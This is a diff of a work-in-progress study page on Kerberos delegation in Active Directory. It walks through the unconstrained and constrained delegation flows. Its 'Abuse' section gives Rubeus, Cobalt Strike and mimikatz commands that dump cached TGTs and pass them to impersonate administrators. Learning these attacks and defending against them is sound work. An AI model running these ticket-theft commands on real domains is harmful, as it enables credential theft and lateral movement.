@@ -1,6 +1,6 @@
 # Delegation (WIP)
 
-Personally, Kerberos and its delegation mechanisms have always been a little hazy for me, and I wanted to take the time to understand it. Basically, this page is my attempt of understanding Delegation, why its used and attacks on it phrased in my own words.&#x20;
+Personally, Kerberos and its delegation mechanisms have always been a little fuzzy for me, and I wanted to take the time to understand it. Basically, this page is my attempt of understanding Delegation, why its used and attacks on it phrased in my own words.&#x20;
 
 ## Double Hop Problem
 
@@ -22,7 +22,7 @@ Delegation basically allows a user or machine to act on the behalf of another us
 
 The front-end needs to authenticate to the back-end database (using Kerberos) as the authenticated user. This is how delegation works in a nutshell:
 
-<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
 ### Password / NTLM Authentication?
 
@@ -68,9 +68,92 @@ Exploitation of any of these privileges is not a CVE, but rather an **abuse of a
 
 This is the first type of delegation introduced in Windows 2000. When configured, the KDC would include a copy of the user's TGT **inside the TGS**. when the user accesses the `DB` machine, it extracts the user's TGT from the TGS and caches it in memory. Then, it would use this TGT to request for a TGS, which would allow for the accessing of database resources.
 
-<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 The service can act on behalf of the client in the network **simply by using its TGT**. This feature requires the `SeEnableDelegation` privilege to be enabled. We can configure this like so:
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
 
+With this setting enabled, all we need are credentials for the user. Now suppose that we are on `WEB` machine and want to access the files on the `DB` machine, and we can do so using a web login form. This is how the requests are formed:
+
+1. **AS REQ -->** `WEB` machine requests for TGT from `DC`. This part requires the credentials of the user to be correct in order to authenticate to the KDC.
+2. **AS REP -->** `DC` sends the `web_user` TGT to the `WEB` machine as a reply after verifying that we have the right credentials.&#x20;
+3. **TGS REQ 1 -->** The `WEB` machine would send a TGS REQ, specifying a target SPN such as `HTTP/db.corp.local`. This would be sent along with the TGT.
+4. **TGS REP 1 -->** The KDC notices that we have Unconstrained Delegation set. As such, the resulting HTTP Service Ticket sent back has the `ok-as-delegate` flag set in the reply. This would inform the `WEB` machine that the service is suitable as a delegate. The KDC sends back the TGS required.&#x20;
+5. **TGS REQ 2 -->** The `WEB` machine sends another request to the DC with the TGT and SPN of `krbtgt/corp.local`. `WEB` also asks for a **forwarded TGT** to be sent to the service. The **forwarded flag** of the ticket has been set to true for this.
+6. **TGS REP 2 -->** The KDC expects this request as a follow-up because the Unconstrained setting is enabled, and it expects the **forwarded flag of the TGT to be set to true**. It checks for this, and then it sends back an `encTGSRep` and an **authenticator string** that also has the **forwarded flag set to true**.&#x20;
+7. **AP REQ (HTTP) --> This part happens when we send a request to the resource** (such as `ls \\db\c$` or visiting a particular resource). Using the encrypted TGS REP, the `WEB` machine sends the Service Ticket for `HTTP/db.corp.local` and an Authenticator string received from TGS REP 2. The session key and TGT are present within the `krb-cred` structure, and other information is decrypted here.
+8. **TGS REQ 3 -->** The `DB` machine sends a regular TGS REQ on behalf of the `WEB` user with the authenticator string required. This time, it requests using SPN of `cifs/db.corp.local`.&#x20;
+9. **TGS REP 3 -->** The `DC` replies to `DB` with a basic TGS REP and sends over another `encTGSRep` for the `WEB` user and SPN of `cifs`.&#x20;
+10. **AP REQ (SMB) -->** Another AP REQ through SMB is sent on behalf of the `WEB` user. This time, it presents the `cifs` ticket + authenticator strings.&#x20;
+11. **AP REP (SMB) -->** The `cifs` service sends an AP REP through SMB, which contains an ST for `cifs/db.corp.local` encrypted with the session key.&#x20;
+12. **AP REP (HTTP) -->** The `cifs/db.corp.local` ST is sent back to the `WEB` machine, and this establishes mutual authentication between the `WEB` and `DB` machines. Thus, we can access the file system or other resources of the `DB` machine from `WEB` after this final reply.
+
+That's a lot to take in. Here's a packet capture from ATTL4S regarding this subject (take note he uses different machines here, but the concept is roughly the same):
+
+<figure><img src="../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>
+
+### Abuse
+
+Unconstrained Delegation would cache the user's TGT regardless of which service is being accessed by the user. For example, if an administrator accesses a file share on the machine that uses Kerberos, their TGT will be cached.&#x20;
+
+If we can compromise this machine, the TGTs can be extracted from memory and used to impersonate the users against other services in the domain.  This can be done through:
+
+* Phishing
+* Abuse of user clicking on certain files (like `.lnk` or `.scf` files)
+* RPC, abusing `xp_dirtree`, using tools such as `SharpSpoolTrigger.exe`, etc... As long as are able to make one machine interact with another in some way.&#x20;
+
+We can use `Rubeus.exe` to exploit this. Suppose that we have the use'rs TGT already cached on the machine (via forcing or scheduled task exploitation). We can use the `triage` and `dump` functions to retrieve this ticket:
+
+<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong># find all tickets
+</strong><strong>Rubeus.exe triage
+</strong><strong># dump tickets
+</strong>Rubeus.exe dump /luid:0x14794e /nowrap
+# pass this ticket
+Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:corp.local /username:administrator /password:password123 /ticket:&#x3C;TICKET>
+# in cobalt strike
+steal_token &#x3C;PID> 
+</code></pre>
+
+Alternatively, we can use `mimikatz` to exploit this by first exporting all tickets and then passing them along to allow us to access the remote file system or establish a remote Powershell session.
+
+{% code overflow="wrap" %}
+```
+mimikatz::tickets /export
+
+mimikatz # kerberos::ptt C:\Users\Administrator\Desktop\mimikatz\[0;3c785]-2-0-40e10000-Administrator@krbtgt-OFFENSE.LOCAL.kirbi
+```
+{% endcode %}
+
+## Constrained Delegation
+
+This new method was introduced in 2003 as a safer means to perform Kerberos delegation. It is the same thing, but this time it **restricts the services to which the server can act on behalf of a user**. It also no longer allows the server to cache the TGTs of other users, but **it does allow for the server to request a TGS for another user with its own TGT**.
+
+To configure this, we just have to check the other setting and specify what type of authentication is allowed:
+
+<figure><img src="../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>
+
+Additionally, there are 2 new Service-For-User (S4U) Kerberos extensions introduced for these services:
+
+* Kerberos constrained delegation extension called **S4UProxy**.
+  * Allows a service to obtain a ST on behalf of a client to a different service.
+  * Only ST is required to show that client has authenticated.
+* Kerberos protocol transition extension called **S4USelf**.
+  * Allows a service to obtain a **ST to itself** to show that a client has authenticated.
+  * Any service account with an SPN can invoke S4U2Self. The resulting ST can vary depending on the rights of the service account.
+
+The **Kerberos only** option uses S4U2Proxy, while the other option both new extensions. Setting up these configurations requires either DA or EA privileges (to enable `SeEnableDelegation`). I'll break both of these options down here.
+
+### Kerberos Only
+
+In the interest of keeping this page shorter, I won't be covering the full request here since it's largely the same as Unconstrained Delegation except for a few changes. Again, ATTL4S provides a clear packet capture on how it works:
+
+<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+
+The main difference here is the replacement of the TGS REQ and TGS REP to the `cifs` service with the S4U2Proxy extension. It's the same up the point AFTER the AP REQ (HTTP) part:
+
+1. **TGS REQ 3 -->** This takes the machine's TGT + authenticator string and sends a request for SPN `cifs/db.corp.local`. Additionally, the user's ST is sent too. This request would have the RBCD and Constrained Delegation flags set to **true**. The user's ST also has the **forwardable** flag set to **true**.&#x20;
+2. **TGS REP 3 -->** The DC checks whether the current `WEB` machine is able to delegate to the service requested (whether `WEB` can delegate to `DB`). It then responds with the user's ST + Session Key.&#x20;
+3. **AP REQ (SMB) -->** The `WEB` machine sends an AP REQ through SMB on behalf of the user.&#x20;
+
+WIP!
